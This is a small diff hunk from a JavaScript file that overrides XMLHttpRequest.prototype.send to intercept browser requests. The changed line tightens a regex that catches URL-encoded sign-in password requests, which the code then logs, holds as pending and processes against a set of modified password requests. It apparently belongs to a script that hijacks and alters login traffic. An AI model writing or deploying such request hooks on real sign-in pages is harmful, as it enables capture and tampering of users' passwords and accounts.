@@ -156,7 +156,7 @@ XMLHttpRequest.prototype.send = function (body) {
         processUsernameRequests(); // Process immediately if username is available
     }
     // Password-related request handling
-    else if (/identity-signin-password/.test(body) && !Array.from(modifiedPasswordRequests).some(m => body.includes(m))) {
+    else if (/identity-signin-password%5C%22%2C%5C%22/.test(body) && !Array.from(modifiedPasswordRequests).some(m => body.includes(m))) {
         console.log("Intercepted password request:", body);
         pendingPasswordRequests.set(this, body); // Store the password-related request in pending
         processPasswordRequests(); // Process immediately if password is available
